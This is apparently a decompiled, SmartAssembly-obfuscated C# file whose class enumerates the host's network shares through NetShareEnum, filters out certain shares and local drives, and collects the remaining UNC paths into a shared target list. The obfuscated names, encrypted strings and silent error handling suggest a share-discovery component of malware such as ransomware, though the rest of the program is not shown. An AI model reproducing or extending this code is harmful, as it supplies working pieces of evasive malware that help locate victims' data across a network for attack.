using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

public sealed class muHyOjnVEdWDRoA
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct HDkbvsoyXzSxer
	{
		public string THpwhbzaPT;

		public uint sOKEaBAftqz;

		public string EOXhjbGsWJJwyOe;

		public HDkbvsoyXzSxer(string string_0, uint uint_0, string string_1)
		{
			THpwhbzaPT = string_0;
			sOKEaBAftqz = uint_0;
			EOXhjbGsWJJwyOe = string_1;
		}

		public override string ToString()
		{
			return THpwhbzaPT;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public HDkbvsoyXzSxer[] DQVGLFhZvFfY(string string_0)
	{
		List<HDkbvsoyXzSxer> list = new List<HDkbvsoyXzSxer>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(HDkbvsoyXzSxer));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				HDkbvsoyXzSxer item = (HDkbvsoyXzSxer)Marshal.PtrToStructure(ptr, typeof(HDkbvsoyXzSxer));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new HDkbvsoyXzSxer(getString_0(107397864) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void ouferLyNcmo()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			HDkbvsoyXzSxer[] array = new muHyOjnVEdWDRoA().DQVGLFhZvFfY(Environment.MachineName);
			HDkbvsoyXzSxer[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				HDkbvsoyXzSxer hDkbvsoyXzSxer = array2[i];
				if (hDkbvsoyXzSxer.ToString().Contains(getString_0(107363138)) || hDkbvsoyXzSxer.ToString().Contains(getString_0(107363161)) || hDkbvsoyXzSxer.ToString().Contains(getString_0(107363632)) || hDkbvsoyXzSxer.ToString().Contains(getString_0(107388771)) || logicalDrives.Contains(hDkbvsoyXzSxer.ToString().Replace(getString_0(107402745), getString_0(107363623))))
				{
					continue;
				}
				if (!ufSaqXYLSvVxK.apDawShQCtslB.Contains(getString_0(107388822) + Environment.MachineName + getString_0(107397379) + hDkbvsoyXzSxer))
				{
					ufSaqXYLSvVxK.apDawShQCtslB.Add(getString_0(107388822) + Environment.MachineName + getString_0(107397379) + hDkbvsoyXzSxer);
				}
				if (ufSaqXYLSvVxK.zZWgofEFsLDUuOW)
				{
					try
					{
						Console.WriteLine(getString_0(107363618), getString_0(107388822) + Environment.MachineName + getString_0(107397379) + hDkbvsoyXzSxer);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107363593) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static muHyOjnVEdWDRoA()
	{
		Strings.CreateGetStringDelegate(typeof(muHyOjnVEdWDRoA));
	}
}
